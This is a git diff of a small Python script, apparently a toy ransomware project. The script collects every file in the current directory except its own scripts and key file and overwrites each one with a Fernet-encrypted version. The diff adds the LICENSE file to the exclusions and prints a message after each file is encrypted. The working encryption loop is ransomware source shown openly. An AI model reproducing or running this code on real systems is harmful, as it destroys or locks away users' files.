@@ -7,7 +7,7 @@ files = []
 
 ## Loops trough the directory and adds all the files that are not current file neither the key into an array
 for file in os.listdir():
-    if file == "equisde.py" or file == "lol.key" or file == "edsiuqe.py":
+    if file == "equisde.py" or file == "lol.key" or file == "edsiuqe.py" or file == "LICENSE":
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -24,3 +24,4 @@ for file in  files: ## reads the contents encrypts them and writes the encrypted
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as dieDatei:
         dieDatei.write(contents_encrypted)
+    print(file + "Has been encrypted")
